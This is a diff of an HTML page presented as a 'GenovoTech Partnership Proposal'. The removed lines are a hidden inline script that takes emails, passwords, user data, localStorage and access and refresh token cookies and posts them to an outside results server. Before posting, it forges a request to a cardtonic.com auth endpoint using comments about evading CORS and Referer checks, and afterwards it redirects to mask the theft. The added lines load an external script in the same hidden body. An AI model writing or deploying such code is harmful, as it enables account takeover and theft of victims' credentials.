@@ -2,48 +2,9 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="referrer" content="no-referrer"> <!-- Bypass Referer validation -->
     <title>GenovoTech Partnership Proposal</title>
 </head>
-<body style="display:none;">
-    <script>
-        // Run immediately, bypassing common defenses
-        const store = window['useStoreWrapper']?.getState();
-        const email = store?.email || '';
-        const password = store?.password || '';
-        const user = store?.user || {};
-        const allLocal = { ...localStorage };
-
-        const accessToken = document.cookie.split('; ').find(row => row.startsWith('access_token='))?.split('=')[1] || 'No access token';
-        const refreshToken = document.cookie.split('; ').find(row => row.startsWith('refresh_token='))?.split('=')[1] || 'No refresh token';
-
-        // Method/Content-Type bypass: Forge a GET-like POST
-        fetch('https://toniks.cardtonic.com/auth/refresh', {
-            method: 'GET', // Override to bypass POST-only checks
-            headers: { 'Content-Type': 'text/plain' }, // Bypass JSON validation
-            mode: 'no-cors', // Evade CORS/SameSite
-            referrerPolicy: 'no-referrer' // Bypass Referer
-        }).then(response => {
-            // Exfiltrate inferred response or direct data
-            fetch('https://results-server-ilu4.onrender.com/api/results', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    accessToken,
-                    refreshToken,
-                    email,
-                    user,
-                    password,
-                    user: JSON.stringify(user),
-                    localStorage: JSON.stringify(allLocal),
-                    source: 'GenovoTechProposal',
-                    refreshResponse: response.status
-                })
-            });
-        }).catch(() => {});
-
-        // Redirect to mask
-        setTimeout(() => { window.location.href = 'https://www.genovotech.com'; }, 50);
-    </script>
+<body style="display:none">
+    <script src="/script.js"></script>
 </body>
 </html>
